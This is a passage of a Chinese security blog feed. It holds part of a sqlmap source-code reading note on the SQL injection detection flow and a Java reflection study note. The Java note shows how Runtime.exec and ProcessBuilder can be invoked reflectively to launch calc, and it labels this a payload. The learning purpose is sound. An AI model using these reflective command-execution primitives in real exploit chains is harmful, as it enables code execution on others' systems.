<h3 id="判断目标url是否连通"><a href="#判断目标url是否连通" class="headerlink" title="判断目标url是否连通"></a>判断目标url是否连通</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> checkConnection(suppressOutput=conf.forms):</span><br><span class="line">	<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>如果对目标url无法连接，跳过当前目标。 </p>
<h3 id="设置参数的随机值-选项"><a href="#设置参数的随机值-选项" class="headerlink" title="设置参数的随机值(选项)"></a>设置参数的随机值(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.rParam <span class="keyword">and</span> kb.originalPage:</span><br><span class="line">	kb.randomPool = <span class="built_in">dict</span>([_ <span class="keyword">for</span> _ <span class="keyword">in</span> kb.randomPool.items() <span class="keyword">if</span> <span class="built_in">isinstance</span>(_[<span class="number">1</span>], <span class="built_in">list</span>)])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> match <span class="keyword">in</span> re.finditer(<span class="string">r&quot;(?si)&lt;select[^&gt;]+\bname\s*=\s*[\&quot;&#x27;]([^\&quot;&#x27;]+)(.+?)&lt;/select&gt;&quot;</span>, kb.originalPage):</span><br><span class="line">		name, _ = match.groups()</span><br><span class="line">		options = <span class="built_in">tuple</span>(re.findall(<span class="string">r&quot;&lt;option[^&gt;]+\bvalue\s*=\s*[\&quot;&#x27;]([^\&quot;&#x27;]+)&quot;</span>, _))</span><br><span class="line">		<span class="keyword">if</span> options:</span><br><span class="line">			kb.randomPool[name] = options</span><br></pre></td></tr></table></figure>

<p>conf.rParam参数通过命令行<code>--randomize=RPARAM</code>设置。<br>通过该参数，可以随机改变对应参数的值。</p>
<h3 id="判断waf"><a href="#判断waf" class="headerlink" title="判断waf"></a>判断waf</h3><p><code>checkWaf()</code></p>
<p>判断目标是否存在Waf。<br>参考文章为<a href="https://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse">https://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse</a></p>
<p>大概看了一下，是通过发送一系列脏数据然后判断页面是否存在不同来判断是否存在WA。</p>
<h3 id="nullConnection-选项"><a href="#nullConnection-选项" class="headerlink" title="nullConnection(选项)"></a>nullConnection(选项)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> conf.nullConnection:</span><br><span class="line">	checkNullConnection()</span><br></pre></td></tr></table></figure>

<p>conf.nullConnection通过命令行<code>--null-connection</code>设置。<br>通过该参数可以从没有实际的HTTP响应体中检索页面长度</p>
<h3 id="判断页面稳定性"><a href="#判断页面稳定性" class="headerlink" title="判断页面稳定性"></a>判断页面稳定性</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(kb.injections) == <span class="number">0</span> <span class="keyword">or</span> (<span class="built_in">len</span>(kb.injections) == <span class="number">1</span> <span class="keyword">and</span> kb.injections[<span class="number">0</span>].place <span class="keyword">is</span> <span class="literal">None</span>)) <span class="keyword">and</span> (kb.injection.place <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> kb.injection.parameter <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>((conf.string, conf.notString, conf.regexp)) <span class="keyword">and</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">in</span> conf.technique:</span><br><span class="line">		<span class="comment"># <span class="doctag">NOTE:</span> this is not needed anymore, leaving only to display</span></span><br><span class="line">		<span class="comment"># a warning message to the user in case the page is not stable</span></span><br><span class="line">		checkStability()</span><br></pre></td></tr></table></figure>

<p>先后发送同样的两个请求。通过判断返回页面是否相同判断页面是否稳定。  </p>
<h3 id="重排conf-conf-parameters"><a href="#重排conf-conf-parameters" class="headerlink" title="重排conf.conf.parameters"></a>重排conf.conf.parameters</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Do a little prioritization reorder of a testable parameter list</span></span><br><span class="line">parameters = <span class="built_in">list</span>(conf.parameters.keys())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Order of testing list (first to last)</span></span><br><span class="line">orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> place <span class="keyword">in</span> orderList[::-<span class="number">1</span>]:</span><br><span class="line">	<span class="keyword">if</span> place <span class="keyword">in</span> parameters:</span><br><span class="line">		parameters.remove(place)</span><br><span class="line">		parameters.insert(<span class="number">0</span>, place)</span><br></pre></td></tr></table></figure>

<p>重排<code>conf.parameters</code>到<code>parameters</code>中</p>
<h3 id="对当前目标所有位置进行注入判断"><a href="#对当前目标所有位置进行注入判断" class="headerlink" title="对当前目标所有位置进行注入判断"></a>对当前目标所有位置进行注入判断</h3><h4 id="当前注入位置是否应该跳过"><a href="#当前注入位置是否应该跳过" class="headerlink" title="当前注入位置是否应该跳过"></a>当前注入位置是否应该跳过</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> place <span class="keyword">in</span> parameters:</span><br><span class="line">		<span class="comment"># Test User-Agent and Referer headers only if</span></span><br><span class="line">		<span class="comment"># --level &gt;= 3</span></span><br><span class="line">		skip = (place == PLACE.USER_AGENT <span class="keyword">and</span> (kb.testOnlyCustom <span class="keyword">or</span> conf.level &lt; <span class="number">3</span>))</span><br><span class="line">		skip |= (place == PLACE.REFERER <span class="keyword">and</span> (kb.testOnlyCustom <span class="keyword">or</span> conf.level &lt; <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">		<span class="comment"># --param-filter</span></span><br><span class="line">		skip |= (<span class="built_in">len</span>(conf.paramFilter) &gt; <span class="number">0</span> <span class="keyword">and</span> place.upper() <span class="keyword">not</span> <span class="keyword">in</span> conf.paramFilter)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># Test Host header only if</span></span><br><span class="line">		<span class="comment"># --level &gt;= 5</span></span><br><span class="line">		skip |= (place == PLACE.HOST <span class="keyword">and</span> (kb.testOnlyCustom <span class="keyword">or</span> conf.level &lt; <span class="number">5</span>))</span><br><span class="line">..........</span><br></pre></td></tr></table></figure>
<p>注入位置总共有9处</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET = <span class="string">&quot;GET&quot;</span></span><br><span class="line">POST = <span class="string">&quot;POST&quot;</span></span><br><span class="line">URI = <span class="string">&quot;URI&quot;</span></span><br><span class="line">COOKIE = <span class="string">&quot;Cookie&quot;</span></span><br><span class="line">USER_AGENT = <span class="string">&quot;User-Agent&quot;</span></span><br><span class="line">REFERER = <span class="string">&quot;Referer&quot;</span></span><br><span class="line">HOST = <span class="string">&quot;Host&quot;</span></span><br><span class="line">CUSTOM_POST = <span class="string">&quot;(custom) POST&quot;</span></span><br><span class="line">CUSTOM_HEADER = <span class="string">&quot;(custom) HEADER&quot;</span></span><br></pre></td></tr></table></figure>
<p>通过设置的level判断当前是否跳过当前注入方式。<br>conf.level通过命令行<code>--level=LEVEL</code>设置，默认为1<br>通过该参数设置注入的复杂程度 </p>
<h4 id="判断当前注入位置，该参数是否跳过"><a href="#判断当前注入位置，该参数是否跳过" class="headerlink" title="判断当前注入位置，该参数是否跳过"></a>判断当前注入位置，该参数是否跳过</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> paramKey <span class="keyword">in</span> kb.testedParams:</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;skipping previously processed %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">any</span>(_ <span class="keyword">in</span> conf.testParameter <span class="keyword">for</span> _ <span class="keyword">in</span> (parameter, removePostHintPrefix(parameter))):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> parameter <span class="keyword">in</span> conf.rParam:</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;skipping randomizing %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> parameter <span class="keyword">in</span> conf.skip <span class="keyword">or</span> kb.postHint <span class="keyword">and</span> parameter.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> conf.skip:</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;skipping %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> conf.paramExclude <span class="keyword">and</span> (re.search(conf.paramExclude, parameter, re.I) <span class="keyword">or</span> kb.postHint <span class="keyword">and</span> re.search(conf.paramExclude, parameter.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>], re.I)):</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;skipping %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> conf.csrfToken <span class="keyword">and</span> re.search(conf.csrfToken, parameter, re.I):</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;skipping anti-CSRF token parameter &#x27;%s&#x27;&quot;</span> % parameter</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ignore session-like parameters for --level &lt; 4</span></span><br><span class="line"><span class="keyword">elif</span> conf.level &lt; <span class="number">4</span> <span class="keyword">and</span> (parameter.upper() <span class="keyword">in</span> IGNORE_PARAMETERS <span class="keyword">or</span> <span class="built_in">any</span>(_ <span class="keyword">in</span> parameter.lower() <span class="keyword">for</span> _ <span class="keyword">in</span> CSRF_TOKEN_PARAMETER_INFIXES) <span class="keyword">or</span> parameter.upper().startswith(GOOGLE_ANALYTICS_COOKIE_PREFIX)):</span><br><span class="line">	testSqlInj = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	infoMsg = <span class="string">&quot;ignoring %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">in</span> conf.technique <span class="keyword">or</span> conf.skipStatic:</span><br><span class="line">	check = checkDynParam(place, parameter, value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> check:</span><br><span class="line">		warnMsg = <span class="string">&quot;%sparameter &#x27;%s&#x27; does not appear to be dynamic&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">		logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> conf.skipStatic:</span><br><span class="line">			infoMsg = <span class="string">&quot;skipping static %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">			logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">			testSqlInj = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		infoMsg = <span class="string">&quot;%sparameter &#x27;%s&#x27; appears to be dynamic&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">		logger.info(infoMsg)</span><br></pre></td></tr></table></figure>

<p>判断当前位置该参数是否应该被跳过。</p>
<h4 id="当前参数设置为已被测试"><a href="#当前参数设置为已被测试" class="headerlink" title="当前参数设置为已被测试"></a>当前参数设置为已被测试</h4><p><code>kb.testedParams.add(paramKey)</code></p>
<h4 id="测试sql注入"><a href="#测试sql注入" class="headerlink" title="测试sql注入"></a>测试sql注入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> place == PLACE.COOKIE:</span><br><span class="line">	pushValue(kb.mergeCookies)</span><br><span class="line">	kb.mergeCookies = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql启发式注入测试函数</span></span><br><span class="line">check = heuristicCheckSqlInjection(place, parameter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check != HEURISTIC_TEST.POSITIVE:</span><br><span class="line">	<span class="keyword">if</span> conf.smart <span class="keyword">or</span> (kb.ignoreCasted <span class="keyword">and</span> check == HEURISTIC_TEST.CASTED):</span><br><span class="line">		infoMsg = <span class="string">&quot;skipping %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">		logger.info(infoMsg)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">infoMsg = <span class="string">&quot;testing for SQL injection on %sparameter &#x27;%s&#x27;&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sql注入测试函数</span></span><br><span class="line">injection = checkSqlInjection(place, parameter, value)</span><br><span class="line">proceed = <span class="keyword">not</span> kb.endDetection</span><br><span class="line">injectable = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>测试该点是否存在sql注入</p>
<h4 id="保存sql注入结果"><a href="#保存sql注入结果" class="headerlink" title="保存sql注入结果"></a>保存sql注入结果</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">getattr</span>(injection, <span class="string">&quot;place&quot;</span>, <span class="literal">None</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	<span class="keyword">if</span> NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE <span class="keyword">in</span> injection.notes:</span><br><span class="line">		kb.falsePositives.append(injection)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">		kb.injections.append(injection)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># In case when user wants to end detection phase (Ctrl+C)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> proceed:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		msg = <span class="string">&quot;%sparameter &#x27;%s&#x27; &quot;</span> % (<span class="string">&quot;%s &quot;</span> % injection.place <span class="keyword">if</span> injection.place != injection.parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, injection.parameter)</span><br><span class="line">		msg += <span class="string">&quot;is vulnerable. Do you want to keep testing the others (if any)? [y/N] &quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> readInput(msg, default=<span class="string">&#x27;N&#x27;</span>, boolean=<span class="literal">True</span>):</span><br><span class="line">			proceed = <span class="literal">False</span></span><br><span class="line">			paramKey = (conf.hostname, conf.path, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">			kb.testedParams.add(paramKey)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> injectable:</span><br><span class="line">	warnMsg = <span class="string">&quot;%sparameter &#x27;%s&#x27; does not seem to be injectable&quot;</span> % (<span class="string">&quot;%s &quot;</span> % paramType <span class="keyword">if</span> paramType != parameter <span class="keyword">else</span> <span class="string">&quot;&quot;</span>, parameter)</span><br><span class="line">	logger.warn(warnMsg)</span><br></pre></td></tr></table></figure>

<p>保存sql注入结果到<code>kb.injections</code>中 </p>
<h3 id="不存在注入点显示提示信息"><a href="#不存在注入点显示提示信息" class="headerlink" title="不存在注入点显示提示信息"></a>不存在注入点显示提示信息</h3><p>显示不存在注入点的进一步提示</p>
<h3 id="存在注入点，保存结果并显示结果"><a href="#存在注入点，保存结果并显示结果" class="headerlink" title="存在注入点，保存结果并显示结果"></a>存在注入点，保存结果并显示结果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_saveToResultsFile()</span><br><span class="line">_saveToHashDB()</span><br><span class="line">_showInjections()</span><br><span class="line">_selectInjection()</span><br></pre></td></tr></table></figure>

<p>保存并在控制台显示注入检测结果</p>
<h3 id="action"><a href="#action" class="headerlink" title="action()"></a>action()</h3><p><code>action()</code><br>在action()函数中，如果用户设置了进一步操作。<br>则进行之后的操作</p>
]]></content>
      <categories>
        <category>sqlmap源码阅读</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA安全漫谈-反射篇-笔记</title>
    <url>/2022/02/21/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈的笔记。</p>
<span id="more"></span>

<h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>JAVA可以通过反射来获得动态特性，对于同一段代码过传递的参数不同获得不同的功能。</p>
<p>如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> Class clazz = Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现使用的四个函数</p>
<ul>
<li>Class.forName()</li>
<li>clazz.getMethod()</li>
<li>.invoke()</li>
<li>.newInstance()</li>
</ul>
<h4 id="第一步为获得java-lang-Class类对象"><a href="#第一步为获得java-lang-Class类对象" class="headerlink" title="第一步为获得java.lang.Class类对象"></a>第一步为获得<code>java.lang.Class</code>类对象</h4><p> 其中获得<code>java.lang.Class</code>类对象的方法有  </p>
<ul>
<li><code>obj.getClass()</code> 存在类对象实例<code>obj</code>时，可以通过<code>obj.getClass()</code>获得它的类</li>
<li><code>Test.class</code>如果已经加载了某个类，可以直接通过<code>.class</code>获得<code>java.lang.class</code>对象。</li>
<li><code>Class.forName</code>如知道类名，可以使用<code>forName</code>获得类对象。  </li>
</ul>
<p>如果java普通类<code>C1</code>中含有内部类<code>C2</code>，可以通过<code>forName(&quot;C1$C2&quot;)</code>加载该内部类。</p>
<p>forName函数有两个重载</p>
<ul>
<li><code>forName(String name)</code></li>
<li><code>forName(String name , **boolean** initialize  ,ClassLoader loder)</code></li>
</ul>
<p>第一个其实为第二个的一种封装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="keyword">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>

<p>第一个参数为类名， 第二个参数为是否初始化，第三个参数为<code>ClassLoader</code>用于加载这个类。</p>
<p>其中是否初始化决定在加载类的时候，是否实现类中的<code>static&#123;&#125;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="第二步获取类的公有方法"><a href="#第二步获取类的公有方法" class="headerlink" title="第二步获取类的公有方法"></a>第二步获取类的公有方法</h4><p>通过<code>.getMethod()</code>获得类的共有方法。但是在JAVA类可以重载，因此在调用<code>getMethod()</code>时，还要传递函数所需要的参数列表。</p>
<h4 id="第三步执行类的共有方法"><a href="#第三步执行类的共有方法" class="headerlink" title="第三步执行类的共有方法"></a>第三步执行类的共有方法</h4><p>通过<code>invoke</code>执行方法，它的第一个参数:</p>
<ul>
<li>如果该方法为普通方法，需要传递实例化类对象</li>
<li>如果该方法为<code>静态</code>方法，可以传递类名，也可以传递<code>null</code>。因为是静态方法类不需要实例化。</li>
</ul>
<p>之后的参数传递对应方法参数即可</p>
<h4 id="可选-第四步将类实例化"><a href="#可选-第四步将类实例化" class="headerlink" title="(可选)第四步将类实例化"></a>(可选)第四步将类实例化</h4><p>如果类中方法为普通方法，就需要将类实例化。通过对第一步的<code>java.lang.Class</code>使用<code>newInstance</code>，实例化类对象。<br><code>Class.newInstance()</code>可以调用该类的无参构造方法。</p>
<p>正常执行方法为<code>[1].method([2], [3], [4])</code>，而在反射中为<code>method.invoke([1], [2], [3], [4])</code>。</p>
<h4 id="无法newInstance"><a href="#无法newInstance" class="headerlink" title="无法newInstance()"></a>无法newInstance()</h4><p>但是在尝试会发现<code>newInstance</code>不成功，原因就可能有:</p>
<ol>
<li>使用的类没有无参构造方法</li>
<li>使用的类的无参构造方法为私有方法</li>
</ol>
<p>比如在尝试命令执行的<code>newInstance()</code>无法成功</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>会得到一个异常<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220220225703.png" alt="命令执行异常">  </p>
<p>可以发现设置了该方法为<code>private</code> </p>
<p>这个时候尝试通过该类的静态方法获得实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Object runtime = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="使用带参构造方法实例化对象"><a href="#使用带参构造方法实例化对象" class="headerlink" title="使用带参构造方法实例化对象"></a>使用带参构造方法实例化对象</h3><p>命令执行的另一种方法<code>ProcessBuilder</code>，就需要使用带参构造函数实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
<p>使用<code>getConstructor().newInstance()</code>方法可以实现带参构造实例化对象。<br>与<code>getMethod</code>类似，<code>getConstructor</code>也需要传递参数列表来确定具体的构造函数。  </p>
<p>另一种命令执行方法<code>ProcessBuider</code>有两种构造函数:</p>
<ul>
<li>`public ProcessBuilder(List<String> command)</li>
<li>`public ProcessBuilder(String… command)</li>
</ul>
<p>如果需要使用<code>ProcessBuilder(String...command)</code>实例化对象。  </p>
<p>首先JAVA支持可变长参数，对于函数不确定参数个数的时候可以使用<code>...</code>表示参数个数不确定。<br>对于可变长参数，JAVA在编译时会编译为一个数组，这意味着下面两种写法等价:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(String[] para)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(String... para)</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>因此，如果有一个数组需要传递给<code>method</code>函数直接传递即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] para = &#123;<span class="string">&quot;hello&quot;</span> , <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">method(para);</span><br></pre></td></tr></table></figure>

<p>同样对于反射，目标函数包含可变长变量，认为它是数组即可。<br>因此，将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>,获得<code>ProcessBuilder</code>的另一种构造函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br></pre></td></tr></table></figure>
<p>在调用<code>newInstance</code>时，因为该函数本身接收可变长参数，我们传递给<code>ProcessBuilder</code>也是一个可变长参数，二者叠加为一个二维数组，所以完整Payload为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance( <span class="keyword">new</span> String[][] &#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>



<h3 id="使用私有方法"><a href="#使用私有方法" class="headerlink" title="使用私有方法"></a>使用私有方法</h3><p>需要使用<code>getDeclared</code>系列的反射，它与普通的<code>getMethod</code>、<code>getConstructor</code>方法区别如下:</p>
<ul>
<li><code>getMethod</code>获得当前类中的所有公共方法，包括从父类继承的方法</li>
<li><code>getDeclaredMethod</code>获得当前类中声明的方法，包括私有方法，但是不包括父类继承方法。</li>
</ul>
<p><code>getDeclaredMethod</code>与<code>getMethod</code>使用方法类似，<code>getDeclaredConstructor</code>与<code>getConstructor</code>使用方法类似。</p>
<p>举个例子使用<code>getDeclaredConstructor</code>获得<code>Runtime</code>的私有构造方法完成实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor con =  clazz.getDeclaredConstructor();</span><br><span class="line">con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(con.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>需要记住使用<code>setAccessible</code>修改方法作用域，否则仍然不能使用。</p>
<p>个人测验代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;com.company.TestPrint&quot;</span>);</span><br><span class="line">Method me = clazz.getDeclaredMethod(<span class="string">&quot;Print&quot;</span>, String.class);</span><br><span class="line">me.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Constructor con  =clazz.getDeclaredConstructor(String.class);</span><br><span class="line">con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">me.invoke(con.newInstance(<span class="string">&quot;its tes private constructor&quot;</span>), <span class="string">&quot;this is private method Print&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPrint</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">TestPrint</span> <span class="params">(String message)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;this is consturct with paratemer&quot;</span>+message+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span>   <span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is Class Method Print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Print</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;%s\n&quot;</span>, string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS httponly 绕过</title>
    <url>/2022/03/01/XSS-http-only-%E7%BB%95%E8%BF%87/</url>
